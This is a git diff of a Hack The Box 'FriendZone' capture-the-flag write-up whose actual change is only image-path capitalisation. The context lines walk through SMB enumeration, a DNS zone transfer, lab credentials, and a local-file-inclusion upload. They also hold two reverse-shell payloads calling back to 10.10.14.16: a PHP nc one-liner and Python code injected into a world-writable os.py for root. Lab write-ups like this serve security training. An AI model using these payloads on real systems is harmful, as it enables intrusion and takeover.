@@ -72,7 +72,7 @@ Visiting http://10.10.10.123 shows the following page.
 take note of the email domain `"friendzoneportal.red"`
 Neither Gobuster or Nikto give any use full information<br>
 
-![](\Images\htb\friendzone\1.png)<br><br>
+![](\images\htb\friendzone\1.png)<br><br>
 
 #### SMB
 ```
@@ -91,11 +91,11 @@ Have read/write access to "Development" share. Taking note of the comment in the
 
 Running nmap to confirm location of the "Development" share on the machine
 `nmap --script smb-enum-shares -p139 10.10.10.123`<br>
-![](\Images\htb\friendzone\2.png)<br><br>
+![](\images\htb\friendzone\2.png)<br><br>
 
 Connecting to the "general" share find file  "cred.txt" file which has a credentials "for the admin thing" inside<br>
-![](\Images\htb\friendzone\3.png)<br><br>
-![](\Images\htb\friendzone\4.png)<br><br>
+![](\images\htb\friendzone\3.png)<br><br>
+![](\images\htb\friendzone\4.png)<br><br>
 
 Credentials
 `admin:WORKWORKHhallelujah@#`
@@ -109,19 +109,19 @@ dig axfr friendzone.red @10.10.10.123
 
 dig axfr friendzoneportal.red @10.10.10.123
 ```
-<br>![](\Images\htb\friendzone\5.png)<br><br>
+<br>![](\images\htb\friendzone\5.png)<br><br>
 
 Add these to /etc/host file in kali<br>
-![](\Images\htb\friendzone\6.png)<br><br>
+![](\images\htb\friendzone\6.png)<br><br>
 
 Visiting https://administrator1.friendzone.red shows the following page, this is were the credentials from credz.txt are used<br>
 
-![](\Images\htb\friendzone\7.png)<br><br>
+![](\images\htb\friendzone\7.png)<br><br>
 
 
 After logging in we can see that is complaining about a parameter missing<br>
 
-![](\Images\htb\friendzone\8.png)<br><br>
+![](\images\htb\friendzone\8.png)<br><br>
 
 #### Revereshell
 
@@ -131,7 +131,7 @@ system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8888 >
 ?>`
 
 Upload shell to the development share<br>
-![](\Images\htb\friendzone\9.png)<br><br>
+![](\images\htb\friendzone\9.png)<br><br>
 
 Start nc listener on port 8888
 `nc -lvnp 8888`
@@ -139,7 +139,7 @@ Start nc listener on port 8888
 Visit the following to get a reverse shell
 https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell
 
-<br>![](\Images\htb\friendzone\10.png)<br><br>
+<br>![](\images\htb\friendzone\10.png)<br><br>
 
 <hr>
 
@@ -148,14 +148,14 @@ https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc
 In /var/www there is a mysql config file which contains credentials for the user friend
 `friend:Agpyu12!0.213$`
 
-<br>![](\Images\htb\friendzone\11.png)<br><br>
+<br>![](\images\htb\friendzone\11.png)<br><br>
 
 #### SSH
 Login to box with above credentials
 
 `ssh friend@10.10.10.123`
 
-<br>![](\Images\htb\friendzone\12.png)<br><br>
+<br>![](\images\htb\friendzone\12.png)<br><br>
 
 User.txt
 `a9ed20ac****************15ae9a11`
@@ -167,22 +167,22 @@ User.txt
 Root
 
 Run pspy64 to see running services<br>
-![](\Images\htb\friendzone\13.png)<br><br>
+![](\images\htb\friendzone\13.png)<br><br>
 
 After abit a new process is spawned running a python script<br>
-![](\Images\htb\friendzone\14.png)<br><br>
+![](\images\htb\friendzone\14.png)<br><br>
 
 Unfortunately "/opt/server_admin/reporter.py" is owned by root so we can't hijack the script, but the script is making use of the python OS module<br>
-![](\Images\htb\friendzone\15.png)<br><br>
+![](\images\htb\friendzone\15.png)<br><br>
 
 Script is using python 2 (tell by the #!/usr/bin/python at the top)
 
 #### Locating OS.py
 `locate os.py`
-<br>![](\Images\htb\friendzone\16.png)<br><br>
+<br>![](\images\htb\friendzone\16.png)<br><br>
 
 os.py is world writable <br>
-![](\Images\htb\friendzone\17.png)<br><br>
+![](\images\htb\friendzone\17.png)<br><br>
 
 Injecting reverse shell to the bottom of os.py
 ```
@@ -197,10 +197,10 @@ dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 s.close()
 ```
-<br>![](\Images\htb\friendzone\18.png)<br><br>
+<br>![](\images\htb\friendzone\18.png)<br><br>
 
 After a minute get a root shell<br>
-![](\Images\htb\friendzone\19.png)<br><br>
+![](\images\htb\friendzone\19.png)<br><br>
 
 root.txt
 `b0e6c60b****************6a9e90c7`
